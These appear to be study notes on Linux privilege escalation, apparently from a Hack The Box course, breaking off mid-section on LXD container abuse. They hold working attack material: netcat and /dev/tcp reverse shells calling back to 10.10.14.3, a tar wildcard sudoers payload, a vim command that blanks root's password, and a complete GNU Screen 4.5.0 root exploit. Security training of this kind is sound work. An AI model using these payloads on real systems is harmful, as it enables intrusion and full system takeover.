
# 🐧 Introduction to Linux Privilege Escalation

The **root account** on Linux provides full administrative access.
If you gain a **low-privileged shell**, privilege escalation is necessary to obtain root-level control.

## Why Privilege Escalation Matters

* Capture network traffic
* Access sensitive files
* Move laterally in the environment
* On domain-joined systems:

  * Extract NTLM hashes
  * Enumerate & attack Active Directory

## 1️⃣ Enumeration – The Key Step

Enumeration is critical before attempting privilege escalation. Use tools like **LinEnum**, but also know how to enumerate manually.

### OS & Kernel Version

* Identify Linux distribution & version: `Ubuntu`, `Debian`, `Fedora`, `CentOS`, etc.
* Check kernel version for known exploits.
* Be cautious: kernel exploits may cause crashes.

### Running Services

* List services, especially those running as root.
* Examples of vulnerable services:

  * Nagios (CVE-2016-9566)
  * Exim
  * Samba
  * ProFTPd

### 2️⃣ Process Enumeration

```bash
ps aux | grep root
```

Check root-owned processes for potential weaknesses.

### 3️⃣ Installed Packages & Versions

* Outdated packages may have known vulnerabilities.
* Example: **GNU Screen 4.05.00** privilege escalation vulnerability.

### 4️⃣ Logged-In Users

```bash
ps au
```

* Check for other active sessions.
* Possible **local lateral movement** opportunities.

### 5️⃣ Home Directories

```bash
ls /home
```

* Look for **.bash\_history**, **.ssh/**, and configuration files.
* Possible finds:

  * SSH keys for persistence or pivoting.
  * Credentials in config files.
  * Scripts containing passwords.

Example:

```bash
ls -la /home/stacey.jenkins/
```

### 6️⃣ SSH Keys

```bash
ls -l ~/.ssh
```

* `id_rsa` (private key) and `id_rsa.pub` (public key).
* Check ARP cache for reachable hosts.

### 7️⃣ Bash History

```bash
history
```

* May contain passwords, commands, or system information.


### 8️⃣ Sudo Privileges

```bash
sudo -l
```

* Look for **NOPASSWD** entries.
* Some commands run as root can lead to privilege escalation.
* Example:

  ```bash
  (root) NOPASSWD: /usr/sbin/tcpdump
  ```

### 9️⃣ Configuration Files

* Search for `.conf` or `.config` files containing credentials.


### 🔟 Password Hashes

* **Shadow File** (if readable): `/etc/shadow`
* **Passwd File** (with hashes present):

```bash
cat /etc/passwd
```

Hashes can be cracked offline.

### 1️⃣1️⃣ Cron Jobs

```bash
ls -la /etc/cron.daily/
```

* Weak permissions or writable scripts can be abused.
* Example writable backup script: `/etc/cron.daily/backup`

### 1️⃣2️⃣ File Systems & Additional Drives

```bash
lsblk
```

* Unmounted drives may contain sensitive files.

### 1️⃣3️⃣ SETUID & SETGID Binaries

* Allow execution as root without full privileges.
* May be exploitable.

### 1️⃣4️⃣ Writable Directories

```bash
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
```

* `/tmp`, `/var/tmp`, and custom dirs like `/dmz-backups`.


### 1️⃣5️⃣ Writable Files

```bash
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

* Modifiable scripts run by root (via cron jobs) are prime targets.

---

# 🛠 Linux Environment Enumeration

## 1. **Initial Orientation**

When you first get access to a machine (reverse shell, SSH, etc.), it’s important to know **who you are, where you are, and what you can do**.

```bash
whoami
```

* Shows the current username.
* If it’s `root`, you already have full control.
* If it’s a system account (`www-data`, `nobody`), you’ll likely need privilege escalation.

```bash
id
```

* Displays UID, GID, and group memberships.
* Check if you belong to privileged groups like:

  * `sudo` → can run commands as root
  * `docker` → can escape to host
  * `lxd` → can escalate via container mounting
  * `adm` → can read `/var/log` (possible creds in logs)

```bash
hostname
```

* Machine’s network name.
* Useful for pivoting in multi-host networks — can reveal naming conventions.

```bash
ifconfig` or `ip a
```

* Lists network interfaces, assigned IPs, and MAC addresses.
* Look for multiple interfaces (may indicate different networks to pivot into).

```bash
sudo -l
```

* Shows which commands you can run with `sudo` **without** a password.
* Dangerous entries:

  * `ALL` → full root
  * `/bin/bash` or `/bin/sh` → instant root shell
  * Scripts or binaries you can modify → escalation via privilege abuse

## 2. **OS & Kernel Information**

Determining OS and kernel helps you **target known vulnerabilities**.

```bash
cat /etc/os-release
```

* Lists OS name, version, codename.
* Useful for finding OS-specific privilege escalation exploits.

```bash
uname -a
```

* Shows kernel version and architecture.
* Vulnerable kernels may have public exploits (search in `searchsploit`).

💡 Example:
Kernel `5.4.0-42-generic` → Search: `searchsploit linux kernel 5.4.0`

## 3. **Environment Variables & PATH**

Knowing `$PATH` tells you **where the shell looks for binaries** — important for path hijacking attacks.

```bash
echo $PATH
```

* If current directory `.` appears before `/usr/bin`, you could create malicious scripts with the same name as common commands.

```bash
env
```

* Dumps all environment variables.
* Things to look for:

  * `USER`, `HOME` — user info
  * `SHELL` — current shell
  * `HISTFILE` — bash history file
  * `LD_PRELOAD`, `LD_LIBRARY_PATH` — potential shared library injection points
## 4. **System Hardware Info**

Sometimes, system type matters for container escapes, virtual machine exploits, or CPU bugs.

```bash
lscpu
```

* Architecture (x86\_64, ARM, etc.)
* Hypervisor vendor (e.g., KVM, VMware)
* Number of cores (useful for stress testing or DoS attacks)

## 5. **Available Shells**

```bash
cat /etc/shells
```

* Lists installed shells.
* If `bash` is not available but `sh` or `zsh` is, you may need to adapt payloads.
* May find `rbash` (restricted shell) — can look for breakout methods.

## 6. **Security Mechanisms**

```bash
lsmod
```

* Check loaded kernel modules (may reveal security tools).

```bash
ps aux
```

* Check for processes like:

  * `fail2ban` → brute-force protection
  * `auditd` → logs system calls
  * `snort` → IDS
  * `tripwire` → file integrity monitoring

Also check:

```bash
sestatus         # SELinux status
aa-status        # AppArmor profiles
ufw status       # Firewall rules
```

## 7. **Drives & File Systems**

```bash
lsblk
```

* Lists all storage devices and partitions.

```bash
df -h
```

* Shows mounted partitions and free space.
* Writable mounts (especially `/mnt`, `/media`) may allow placing binaries or scripts for escalation.

```bash
cat /etc/fstab
```

* Lists persistent mounts.
* Sometimes contains plaintext credentials for NFS/SMB shares.

## 8. **Networking**

```bash
route
```

* Shows the routing table.
* A `0.0.0.0` route is the default gateway (often another machine to target).

```bash
cat /etc/resolv.conf
```

* Shows DNS servers — can lead to internal DNS enumeration.

```bash
arp -a
```

* Lists nearby devices on the LAN (possible lateral movement targets).

## 9. **Users & Groups**

```bash
cat /etc/passwd
```

* Lists all system accounts.
* Look for unusual accounts with `/bin/bash` (means they can log in).

```bash
grep "sh$" /etc/passwd
```

* Quickly filter only accounts with shell access.

```bash
cat /etc/group
```

* Shows group memberships.
* If you’re in `docker`, `lxd`, or `adm`, you might have escalation paths.

```bash
ls /home
```

* Lists home directories — good place to check for `.ssh` keys or configs.

## 10. **Sensitive Files**

```bash
find / -type f -name "*.conf" 2>/dev/null
find / -type f -name "*.config" 2>/dev/null
```

* Config files may store DB passwords, API tokens, etc.

## 11. **Hidden Files & Directories**

```bash
find / -type f -name ".*" 2>/dev/null
find / -type d -name ".*" 2>/dev/null
```

* Look for `.git`, `.ssh`, `.env`, `.bash_history` — often store secrets.

## 12. **Temporary Files**

```bash
ls -l /tmp /var/tmp /dev/shm
```

* `/tmp` → cleared on reboot (\~10 days)
* `/var/tmp` → persists longer (\~30 days)
* `/dev/shm` → RAM disk, fast storage (also good for hiding malicious files)

## 13. **Quick Exploit Check**

Once OS, kernel, and service versions are known:

```bash
searchsploit <kernel_version>
searchsploit <service_name> <version>
```

* Directly find public exploits to test.

---

# Linux Services & Internals Enumeration

## Overview

* After gathering info about users, groups, files, binaries, scripts, directories, etc., next step is to **deep dive into OS internals**.
* Key objectives:

  * Identify installed services & applications.
  * Identify running services and used sockets.
  * Enumerate users, admins, groups.
  * Check currently logged in and recent login users.
  * Investigate password policies.
  * Check if host is joined to Active Directory domain.
  * Analyze history, logs, backups.
  * Detect recently modified files and cron jobs.
  * Gather IP and network info.
  * Review `/etc/hosts` for interesting entries.
  * Check network connections (internal/external).
  * Identify installed useful tools (e.g. netcat, python, nmap).
  * Access and analyze bash histories for secrets.
  * Detect hijackable cron jobs.
  * Identify multiple interfaces for pivoting potential.

## Internals & Network Interfaces

* The term **internals** means internal configuration & integrated processes.
* Key interfaces are how system communicates externally.

```bash
ip a
```

Example output insights:

* Loopback interface (`lo`) with `127.0.0.1`
* Ethernet interface (`ens192`) with dynamic IP `10.129.203.168/16`
* IPv6 addresses present.
* Multiple interfaces might indicate pivot opportunities.

## /etc/hosts File

```bash
cat /etc/hosts
```

Typical entries:

```
127.0.0.1 localhost
127.0.1.1 hostname
# IPv6 entries for localhost and multicast groups
::1 ip6-localhost ip6-loopback
```

* Useful to map hostnames to IPs locally.
* Sometimes may contain interesting internal network names.

## User Login Information

* Check last login for users to gauge usage frequency:

```bash
lastlog
```

* Look for users who **never logged in** and users with recent logins.

* Analyze typical login times for patterns.

* Check who is currently logged in:

```bash
w
```

* Provides info about active users, their terminals, origin IPs, and idle times.

## Bash History & Command History

* Review shell history for passwords or clues:

```bash
history
```

* Look for:

  * Passwords passed as arguments.
  * Use of git, cron, SSH commands.
  * Any suspicious or privileged commands.

* Search for other history files:

```bash
find / -type f \( -name '*_hist' -o -name '*_history' \) -exec ls -l {} \; 2>/dev/null
```

## Cron Jobs

* Scheduled tasks may run as root or privileged users.
* Enumerate cron jobs for potential hijacking:

```bash
ls -la /etc/cron.daily/
```

* Also check `/etc/cron.hourly/`, `/etc/cron.weekly/`, `/etc/crontab`.
* Look for scripts with weak permissions or relative paths.

## Proc Filesystem

* `/proc` is a virtual filesystem providing real-time system/process info.
* Can inspect running processes, kernel parameters, system memory, devices.
* Use for reconnaissance of system internals.

```bash
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
```

## Installed Packages

* List all installed packages (Debian/Ubuntu example):

```bash
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
```

* Helps identify potentially vulnerable or exploitable software versions.

## Sudo Version

* Check sudo version for known vulnerabilities:

```bash
sudo -V
```

## Binaries on System

* Check common executable directories:

```bash
ls -l /bin /usr/bin /usr/sbin/
```

* Important to find potentially exploitable binaries or setuid programs.

## GTFObins Check

* Compare installed packages/binaries with known exploitable binaries:

```bash
for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d'); do
  if grep -q "$i" installed_pkgs.list; then
    echo "Check GTFO for: $i"
  fi
done
```

## Using strace for Tracing Syscalls

* `strace` can trace program syscalls and signals.
* Useful for:

  * Understanding program behavior.
  * Detecting system calls accessing files, network, credentials.

Example:

```bash
strace ping -c1 10.129.112.20
```

* Can reveal network socket usage, file opens, and other internals.

## Configuration Files & Scripts

* Configuration files often reveal service setups, credentials, paths:

```bash
find / -type f \( -name '*.conf' -o -name '*.config' \) -exec ls -l {} \; 2>/dev/null
```

* Search for scripts that might run regularly or have exploitable permissions:

```bash
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
```
## Running Services & Processes

* Check running processes by user (e.g., root):

```bash
ps aux | grep root
```

* Identify important services running with high privileges.
* Check if any scripts or binaries with weak permissions are running.

---

# Credential Hunting

When enumerating a system, note down any **credentials** you find.  
They can be useful for:
- Escalating privileges (to other users or root)
- Accessing databases
- Accessing other systems in the environment

## Common Locations for Credentials

- **Configuration files**: `.conf`, `.config`, `.xml`
- **Shell scripts**
- **Bash history**: `.bash_history`
- **Backup files**: `.bak`
- **Database files**
- **Plain text files**


## /var Directory & Web Root

- `/var` often contains the **web root** for the web server.
- May contain database credentials or other sensitive information.
- Example: WordPress config file with MySQL credentials

```bash
grep 'DB_USER\|DB_PASSWORD' wp-config.php
````

## Searching for Config Files

Search for config files across the system (excluding `/proc`):

```bash
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
```

Example results:

```
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/etc/python3/debian_config
/etc/kbd/config
/etc/manpath.config
/boot/config-4.4.0-116-generic
...
```

## SSH Keys

* Look for **SSH private keys** — they may belong to more privileged users or allow access to other hosts.
* Check `known_hosts` to identify previously connected systems for potential **lateral movement**.

Example:

```bash
ls ~/.ssh
```

* **`id_rsa`** → Private key
* **`id_rsa.pub`** → Public key
* **`known_hosts`** → Past host connections

---

# Path Abuse

**PATH** is an environment variable that specifies directories where executables can be located.  
It allows running commands without specifying the full absolute path.

Example:
```bash
cat /tmp/test.txt
# Instead of
/bin/cat /tmp/test.txt
````

Check the current PATH:

```bash
env | grep PATH
echo $PATH
```

Example output:

```
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

## Exploiting PATH for Privilege Escalation

### 1. Creating a Malicious Script in a PATH Directory

If we place a script in any directory listed in `$PATH`, it can be run from anywhere.

Example:

```bash
pwd && conncheck
# Output from /usr/local/sbin/conncheck
```

Even when in `/tmp`:

```bash
pwd && conncheck
# Still runs the script from /usr/local/sbin
```

### 2. Adding Current Directory (.) to PATH

By adding `.` to the PATH, binaries in the current directory are executed first.

Example:

```bash
PATH=.:$PATH
export PATH
echo $PATH
```

Output:

```
.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

### 3. Replacing Common Commands

If `. ` is in PATH, you can create malicious versions of common binaries (e.g., `ls`) for command hijacking.

Example:

```bash
touch ls
echo 'echo "PATH ABUSE!!"' > ls
chmod +x ls
ls
```

Output:

```
PATH ABUSE!!
```

---

# Wildcard Abuse

**Wildcards** are special characters interpreted by the shell to match filenames or patterns before executing commands.

## Common Wildcards

| Character | Meaning |
|-----------|---------|
| `*`       | Matches any number of characters in a filename |
| `?`       | Matches a single character |
| `[ ]`     | Matches any single character inside the brackets |
| `~`       | Expands to the home directory of the current user or another user (e.g., `~user`) |
| `-`       | Inside `[ ]` denotes a range of characters |


## Privilege Escalation via Wildcards

Some commands (e.g., **tar**) interpret filenames starting with `--` as **options**.  
If a wildcard (`*`) is used in a command, **maliciously named files** can be executed as options.

### Example: `tar` Abuse with `--checkpoint-action`

From `man tar`:
- `--checkpoint[=N]` → Show progress every N records (default 10)
- `--checkpoint-action=ACTION` → Execute ACTION when a checkpoint is reached

### Scenario

**Vulnerable cron job** runs every minute:
```bash
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```
* The `*` wildcard includes **all files** in the directory as arguments.
* By creating specially named files, we can pass extra options to `tar`.

### Exploit Steps

1. Create a malicious script (`root.sh`) to gain privileges:

```bash
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
```

2. Create files named as `tar` options:

```bash
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
```

3. Verify the created files:

```bash
ls -la
```

Example output:

```
-rw-rw-r-- 1 htb-student htb-student    1 --checkpoint=1
-rw-rw-r-- 1 htb-student htb-student    1 --checkpoint-action=exec=sh root.sh
-rw-rw-r-- 1 htb-student htb-student   60 root.sh
```

4. Wait for the cron job to execute.

### Post-Exploitation

Check sudo privileges:

```bash
sudo -l
```

Output:

```
(root) NOPASSWD: ALL
```

Escalate to root:

```bash
sudo su
```

---

# Escaping Restricted Shells

A **restricted shell** is a type of shell that limits the user's ability to execute commands. Users are only allowed to run specific commands or access certain directories. This is often used in enterprise networks to prevent accidental or intentional system damage.  

Common restricted shells include:  
- **rbash** (Restricted Bourne Shell)  
- **rksh** (Restricted Korn Shell)  
- **rzsh** (Restricted Z Shell)  

## Types of Restricted Shells

### RBASH
- A restricted version of the Bourne shell.  
- Prevents changing directories, setting/modifying environment variables, or executing commands outside allowed directories.  
- Used for basic restrictions on users.  

### RKSH
- Restricted Korn shell.  
- Prevents executing commands in other directories, creating/modifying functions, and modifying the environment.  
- Offers slightly more flexibility than rbash.  

### RZSH
- Restricted Z shell.  
- Prevents running scripts, defining aliases, and modifying the shell environment.  
- More flexible but still controlled.  

## Use Case Example
- **External partners** → assigned to **rbash** for minimal access (e.g., email, file sharing).  
- **Contractors** → assigned to **rksh** for limited advanced access (e.g., DB or web servers).  
- **Employees** → assigned to **rzsh** for running specific applications/scripts.

## Escaping Techniques

### 1. Command Injection
- Exploiting arguments passed to allowed commands.  
- Example (restricted to `ls -l`):  
  ```bash
  ls -l `pwd`
  ```

* Injects `pwd` into the command execution.
* Bypasses restrictions to execute `pwd`.

### 2. Command Substitution

* Using backticks (`` ` ``) or `$()` to execute commands.
* Example:

  ```bash
  ls -l $(whoami)
  ```

### 3. Command Chaining

* Using metacharacters like `;` or `|` to chain commands.
* Example:

  ```bash
  ls -l; id
  ```

### 4. Environment Variables

* Overwriting or creating variables used by the shell.
* Example: modifying `$PATH` to point to user-controlled directories with binaries.

### 5. Shell Functions

* Defining functions to execute restricted commands indirectly.
* Example:

  ```bash
  mysh() { /bin/sh; }
  mysh
  ```

---

# 🔑 Special Permissions in Linux (setuid & setgid)

Linux files and programs have **permissions** that control who can read, write, or execute them. But there are **special permissions** that go beyond the normal `rwx`.

These are:

* **setuid (Set User ID)**
* **setgid (Set Group ID)**

They are represented with an **s** instead of the usual **x** in file permissions.

## 1. ✅ Set User ID (setuid)

* **What it does**:
  When a file/program has the **setuid bit set**, anyone who runs that file will **temporarily gain the permissions of the file’s owner**.

  * Usually, the owner is **root**.
  * This means a normal user can execute the program with **root privileges**.

* **How it looks**:

  ```
  -rwsr-xr-x 1 root root 54256 May 17  2017 /usr/bin/passwd
  ```

  Notice the **`s`** in place of the **x** → `rws` instead of `rwx`.

* **Finding setuid binaries**:

  ```bash
  find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
  ```

## 2. ✅ Set Group ID (setgid)

* **What it does**:
  When a file/program has the **setgid bit set**, anyone who runs it will **temporarily gain the permissions of the file’s group**.

  * Example: If a program is owned by group `admin`, a normal user will run it as if they are in the `admin` group.

* **How it looks**:

  ```
  -rwsr-sr-x 1 root root 85832 Nov 30  2017 /usr/lib/snapd/snap-confine
  ```

  Notice the **`s`** in the **group execute field**.

* **Practical use**:

  * Helps shared applications manage files with group permissions.
  * Example: If multiple users need access to files in a project directory, setgid ensures new files inherit the **group ID** instead of the user’s default group.

* **Finding setgid binaries**:

  ```bash
  find / -uid 0 -perm -6000 -type f 2>/dev/null
  ```


## 3. 🚩 Security Implications

* **Why risky?**

  * Any misconfigured or vulnerable setuid/setgid binary = easy privilege escalation.
  * Attackers can search for these binaries, reverse engineer them, and exploit them.

* **Real-world attacks**:

  * Exploiting `/usr/bin/screen`, `/usr/bin/pkexec`, or old versions of `passwd`.
  * Using GTFOBins (a known database of binaries that can be abused for privilege escalation).

---

# ⚡ Sudo Rights Abuse

**Sudo privileges** allow a user to execute commands as another user (often root) without switching accounts. These privileges are defined in the `/etc/sudoers` file.  

When landing on a system, always check sudo rights:  
```bash
sudo -l
````

* If **NOPASSWD** is present → the user can run the command without entering a password.
* This is often misconfigured and can lead to **privilege escalation**.

## 🔍 Example: Misconfigured sudo with tcpdump

```bash
htb_student@NIX02:~$ sudo -l
User sysadm may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/tcpdump
```

* The user can run **tcpdump** as root, without a password.
* The **`-z postrotate-command`** option of tcpdump allows execution of a command/script after rotating capture files.

## 🚀 Exploiting tcpdump sudo rights

1. **Create a malicious script** (e.g., reverse shell):

   ```bash
   cat /tmp/.test
   rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
   ```

2. **Set up a listener** on the attacker’s machine:

   ```bash
   nc -lnvp 443
   ```

3. **Run tcpdump with sudo and the -z option**:

   ```bash
   sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
   ```

4. **Result**:

   * tcpdump executes the script as **root**.
   * Attacker gains a **root reverse shell**.

#### ⚠️ Limitations

* In newer Linux distros, **AppArmor** and similar protections restrict the `postrotate-command` options (e.g., only gzip/bzip2 allowed).

---

# Privileged Groups Exploitation

## LXC / LXD
- **Overview:**  
  LXD is Ubuntu’s container manager, similar to Docker.  
  Users added to the **lxd** group can escalate privileges.

- **Steps to Exploit:**
  1. Confirm group membership:
     ```bash
     id
     ```
     Example:
     ```
     uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
     ```
  2. Extract Alpine image:
     ```bash
     unzip alpine.zip
     cd 64-bit\ Alpine/
     ```
  3. Import image:
     ```bash
     lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
     ```
  4. Create privileged container:
     ```bash
     lxc init alpine r00t -c security.privileged=true
     ```
  5. Mount host filesystem:
     ```bash
     lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
     ```
  6. Start container and spawn shell:
     ```bash
     lxc start r00t
     lxc exec r00t /bin/sh
     ```
     Inside container:
     ```bash
     id
     uid=0(root) gid=0(root)
     cd /mnt/root/root
     ```
     - Can read sensitive files (`/etc/shadow`, SSH keys, etc.).


## Docker
- **Overview:**  
  Membership in **docker** group is equivalent to root privileges.

- **Exploit Example:**
  ```bash
  docker run -v /root:/mnt -it ubuntu
  ```

* Mounts host `/root` into container at `/mnt`.
* Can add SSH keys or retrieve hashes from `/etc/shadow`.

## Disk

* **Overview:**
  Users in the **disk** group can access block devices in `/dev` (e.g., `/dev/sda1`).

* **Exploit:**

  * Use `debugfs` to browse the filesystem as root.
  * Possible actions:

    * Extract SSH keys
    * Retrieve credentials
    * Add new users

## ADM

* **Overview:**
  Members of the **adm** group can read system logs in `/var/log`.

* **Use Cases:**

  * Not direct root access, but useful for:

    * Collecting sensitive data from logs
    * Enumerating cron jobs and user activity

## Example

```bash
secaudit@NIX02:~$ id
```

---

# Capabilities 

## Overview
- **Linux Capabilities** allow fine-grained privileges for processes instead of full root privileges.
- More secure than the traditional all-or-nothing **UID=0 (root)** model.
- **Risks:**
  - Capabilities given to insecure or unsandboxed processes → privilege escalation.
  - Overuse or misuse of capabilities → binaries have more privileges than needed.

---

## Setting Capabilities
- Use `setcap` to assign capabilities to executables.

**Example:**
```bash
sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

* Grants `vim.basic` permission to bind to network ports.

### Capability Values

| Value | Description                                                   |
| ----- | ------------------------------------------------------------- |
| `=`   | Clears/sets capability without granting privileges.           |
| `+ep` | Grants **effective** + **permitted** privileges.              |
| `+ei` | Grants inheritable privileges (child processes inherit them). |
| `+p`  | Grants only permitted privileges (no inheritance).            |

---

## Dangerous Capabilities

| Capability                  | Description                                                 |
| --------------------------- | ----------------------------------------------------------- |
| **cap\_sys\_admin**         | Broad admin powers: mount/unmount, change settings, etc.    |
| **cap\_sys\_chroot**        | Change root directory for process.                          |
| **cap\_sys\_ptrace**        | Debug/attach to other processes.                            |
| **cap\_sys\_nice**          | Change process priorities.                                  |
| **cap\_sys\_time**          | Modify system clock.                                        |
| **cap\_sys\_resource**      | Modify system resource limits.                              |
| **cap\_sys\_module**        | Load/unload kernel modules.                                 |
| **cap\_net\_bind\_service** | Bind to restricted network ports.                           |
| **cap\_setuid**             | Change effective UID (become another user, including root). |
| **cap\_setgid**             | Change effective GID.                                       |
| **cap\_dac\_override**      | Bypass file read/write/execute permission checks.           |

## Enumerating Capabilities

* Check binaries with special capabilities:

```bash
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

**Example Output:**

```
/usr/bin/vim.basic cap_dac_override=eip
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
```

## Exploitation Example

### Step 1 – Check binary capabilities:

```bash
getcap /usr/bin/vim.basic
/usr/bin/vim.basic cap_dac_override=eip
```

### Step 2 – Use capability to edit restricted files:

```bash
/usr/bin/vim.basic /etc/passwd
```

### Step 3 – Non-interactive privilege escalation:

```bash
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
```

### Step 4 – Verify change:

```bash
cat /etc/passwd | head -n1
root::0:0:root:/root:/bin/bash
```

* The password field for root is now empty → login as root without password:

```bash
su
```

---

# Vulnerable Services – GNU Screen 4.5.0 Exploit

## Overview
- Many services may contain flaws that can be exploited for **privilege escalation**.  
- **GNU Screen v4.5.0** suffers from a vulnerability due to **missing permissions check** when opening a log file.  
- This flaw allows an attacker to:
  - Truncate **any file**.
  - Create a file owned by **root** in any directory.
  - Ultimately gain **full root access**.

## Identifying Vulnerable Screen Version
```bash
screen -v
````

**Output:**

```
Screen version 4.05.00 (GNU) 10-Dec-16
```

* Confirms the system is running the **vulnerable version**.

## Exploitation Workflow

### 1. Run Exploit Script

```bash
./screen_exploit.sh
```

### 2. Verify Root Access

```bash
id
```

**Output:**

```
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),
46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(mrb3n)
```

* Successfully escalated privileges to **root**.

## Proof-of-Concept Exploit Script

```bash
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)

echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."

# Malicious shared library
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c

# Root shell binary
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0); setgid(0);
    seteuid(0); setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
rm -f /tmp/rootshell.c

# Abuse screen to overwrite /etc/ld.so.preload
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # set permissions wide open
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline required

# Trigger payload
echo "[+] Triggering..."
screen -ls # loads the malicious library via setuid root
/tmp/rootshell
```

---

# Cron Job Abuse

## What Are Cron Jobs?
- Cron jobs are scheduled tasks in Unix/Linux systems.
- Configured in **crontab** files and executed by the **cron daemon**.
- Typical use cases: backups, cleanup tasks, system maintenance.
- Crontab entry format:
```

minute hour day month weekday command

````
Example:  
`0 */12 * * * /home/admin/backup.sh` → runs every 12 hours.

## Security Risks
- **Root crontab** usually only editable by root or sudoers.
- Misconfigurations can lead to **privilege escalation**:
- World-writable scripts executed by root.
- Cron files in `/etc/cron.d` editable by non-root users.
- Incorrect scheduling (e.g., running too frequently).

## Example Exploit Scenario
1. **Discovery**  
 - Found a suspicious script: `/dmz-backups/backup.sh`.
 - Script and directory were **world-writable**.
 - Backups created every 3 minutes → likely misconfigured (`*/3 * * * *` instead of `0 */3 * * *`).

 ```bash
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
````
Find all regular files anywhere on the system (except /proc) that anyone can write to, and don’t show error messages.
```bash
ls -la /dmz-backups/
```

2. **Verification with pspy**
 pspy = Process Spy, a Linux tool often used in privilege escalation / red-team ops. It lets you see running processes and cron jobs on a system without root

   * `pspy64 -pf -i 1000` showed `/dmz-backups/backup.sh` being executed by **root** every 3 minutes. (command - Run pspy on a 64-bit system, and every 1 second, show me any new processes that start, including their full command line arguments) .

   ```
   CMD: UID=0    PID=2201   | /bin/bash /dmz-backups/backup.sh
   ```

4. **Original Script**

   ```bash
   #!/bin/bash
   SRCDIR="/var/www/html"
   DESTDIR="/dmz-backups/"
   FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
   tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
   ```

5. **Exploitation**

   * Append a reverse shell payload to the script.

   ```bash
   #!/bin/bash
   SRCDIR="/var/www/html"
   DESTDIR="/dmz-backups/"
   FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
   tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR

   bash -i >& /dev/tcp/10.10.14.3/443 0>&1
   ```

6. **Execution**

   * Start a listener:

     ```bash
     nc -lnvp 443
     ```
   * Within 3 minutes, a **root reverse shell** connects back.

---

# Containers

## Containers Overview
- **Containers** operate at the **OS level**, while **VMs** operate at the **hardware level**.
- Containers:
  - Share the host OS.
  - Isolate application processes.
  - Lightweight compared to VMs.
- Virtual Machines:
  - Run multiple OSes simultaneously on a single host.
- **Isolation & Virtualization Benefits**:
  - Resource management.
  - Improved security (process isolation).
  - Monitoring to detect unrelated system errors.
  - Restrict applications (e.g., web apps, APIs) from escalating privileges.

## Linux Containers (LXC)
- **LXC** = OS-level virtualization to run multiple isolated Linux systems on a single host.
- Containers share the host kernel but have their own processes.
- Advantages:
  - Lightweight, resource-efficient compared to VMs.
  - Standard interface for managing multiple containers.
  - Portability across different clouds.
  - Easy management (start/stop containers, change env variables).
- Became widely popular due to **Docker** ecosystem.

## Linux Daemon (LXD)
- **LXD** = system container manager.
- Runs full OS containers (not just application containers).
- User must be in `lxd` group to use it:
  ```bash
  id
  ```

Example output:

```
uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
```

## Exploiting LXC/LXD

* Attackers can exploit insecure templates or weak configurations.
* Steps to exploit:

### 1. Check for available container images

```bash
cd ContainerImages
ls
```

Example:

```
ubuntu-template.tar.xz
```

### 2. Import the container image

```bash
lxc image import ubuntu-template.tar.xz --alias ubuntutemp
lxc image list
```

### 3. Initialize with privileged flag

* Use `security.privileged=true` to disable isolation.
* Mount host root into container:

```bash
lxc init ubuntutemp privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

### 4. Start and access the container

```bash
lxc start privesc
lxc exec privesc /bin/bash
```

### 5. Access host filesystem as root

```bash
